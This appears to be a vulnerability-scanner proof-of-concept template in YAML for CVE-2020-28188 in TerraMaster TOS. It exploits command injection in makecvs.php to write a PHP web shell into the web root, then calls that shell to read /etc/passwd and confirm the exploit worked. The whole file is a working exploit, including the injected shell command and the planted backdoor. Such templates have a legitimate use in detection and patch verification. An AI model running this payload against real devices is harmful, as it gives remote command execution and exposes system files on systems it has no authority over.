name: poc-yaml-terramaster-cve-2020-28188
set:
  r1: randomLowercase(4)
rules:
  - method: GET
    path: '/include/makecvs.php?Event=http%7Cecho%20%22%3C%3Fphp%20echo%28passthru%28%5C%24_GET%5B%27cmd%27%5D%29%29%3B%3F%3E%22%20%3E%3E%20%2Fusr%2Fwww%2F{{r1}}.php%20%26%26%20chmod%20%2Bx%20%2Fusr%2Fwww%2Fdebug1609913039.php%7C%7C'
    headers:
      Content-Type: text/plain; charset=UTF-8
    follow_redirects: false
    expression: >
      response.status == 200 || response.status == 404
  - method: GET
    path: /{{r1}}.php?cmd="cat%20/etc/passwd"
    expression: >
      response.status == 200 && response.body.bcontains(b"uid") && response.body.bcontains(b"gid") && "root:[x*]:0:0:".bmatches(response.body)
detail:
  author: albertchang
  Affected Version: "Tested on: 4.1.30, 4.2.06"
  links:
    - https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
